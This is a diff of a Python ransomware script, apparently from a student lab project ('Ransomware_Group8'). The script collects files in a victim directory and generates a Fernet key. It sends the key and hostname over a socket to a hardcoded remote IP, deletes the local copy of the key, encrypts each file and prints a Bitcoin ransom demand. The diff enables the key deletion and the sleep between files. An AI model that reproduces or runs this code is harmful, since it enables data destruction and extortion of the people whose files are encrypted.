@@ -22,15 +22,14 @@ for root, dirs, file in os.walk('/media/sf_Ransomware_Group8/Action/Victim_machi
 print(files)
 
 #Socket information
-IP_ADDRESS = '10.125.190.150'
+IP_ADDRESS = '10.125.220.246'
 PORT = 68
 hostname = socket.gethostname()
 
 key = Fernet.generate_key()
-
+print(key)
 with open("/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key", "wb") as thekey:
 	thekey.write(key)
-print(key)
 
 #Connect to server to transfer key and hostname
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -38,7 +37,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 	print('Successfully connected...transmitting key')
 	s.send(f'{key}'.encode('utf-8'))
 	print('Finished transmitting the key!!!')
-#	os.remove('symkey.key')
+	os.remove('/media/sf_Ransomware_Group8/Action/Victim_machine/Imp/symkey.key')
 	s.close()
 
 #Writing the files with the encrypted text using the key
@@ -50,7 +49,7 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
-#	time.sleep(5)
+	time.sleep(5)
 
 print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours!!!")
 
